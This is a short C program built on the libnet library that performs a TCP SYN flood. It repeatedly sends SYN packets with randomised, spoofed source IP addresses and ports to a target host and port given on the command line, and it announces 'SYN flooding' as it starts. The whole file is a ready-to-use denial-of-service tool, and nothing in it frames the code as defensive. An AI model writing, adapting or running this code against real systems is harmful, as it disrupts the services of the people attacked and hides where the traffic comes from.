#include<libnet.h>

#define FLOOD_DELAY 5000

char *print_ip(u_long *ip_addr_ptr) {
		return inet_ntoa( *((struct in_addr *)ip_addr_ptr) );
}

int main(int argc, char **argv) {
	u_long dest_ip;
	u_short dest_port;
	u_char errbuf[LIBNET_ERRBUF_SIZE], *packet;
	int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;

	if(argc<3) {
		printf("Usage: %s <target host> <target port>\n", argv[0]);
		exit(1);
	}

	dest_ip = libnet_name_resolv(argv[1], LIBNET_RESOLVE);
	dest_port	= (u_short) atoi(argv[2]);

	network = libnet_open_raw_sock(IPPROTO_RAW);
	if(network == -1)
		libnet_error(LIBNET_ERR_FATAL, "cant open network interface. -- are you root?\n");
		
	libnet_init_packet(packet_size, &packet);
	if(packet == NULL)
		libnet_error(LIBNET_ERR_FATAL, "cat initialize packet memory.\n");

	libnet_seed_rand();
	
	printf("SYN flooding port %s of %s...\n", dest_port, print_ip(&dest_ip));

	while(1) {
		libnet_build_ip(LIBNET_TCP_H, 
										IPTOS_LOWDELAY,
										libnet_get_prand(LIBNET_PRu16),
										0,
										libnet_get_prand(LIBNET_PR8),
										IPPROTO_TCP,
										libnet_get_prand(LIBNET_PRu32),
										dest_ip,
										NULL,
										0,
										packet);

		libnet_build_tcp(libnet_get_prand(LIBNET_PRu16),
										 dest_port,
										 libnet_get_prand(LIBNET_PRu32),
										 libnet_get_prand(LIBNET_PRu32),
										 TH_SYN,
										 libnet_get_prand(LIBNET_PRu16),
										 0,
										 NULL,
										 0,
										 packet + LIBNET_IP_H);

	if(libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
		libnet_error(LIBNET_ERR_FATAL, "cant compute checksum.\n");

	byte_count = libnet_write_ip(network, packet, packet_size);
	if(byte_count<packet_size)
		libnet_error(LIBNET_ERR_WARNING, 
								 "Warning: Incomplete packet (%d of %d bytes) written\n", 
									byte_count,
									packet_size);

	usleep(FLOOD_DELAY);
	}

	libnet_destroy_packet(&packet);
	
	if(libnet_close_raw_sock(network) == -1)
		libnet_error(LIBNET_ERR_WARNING, "cant clode network interface.");

	return 0;
}
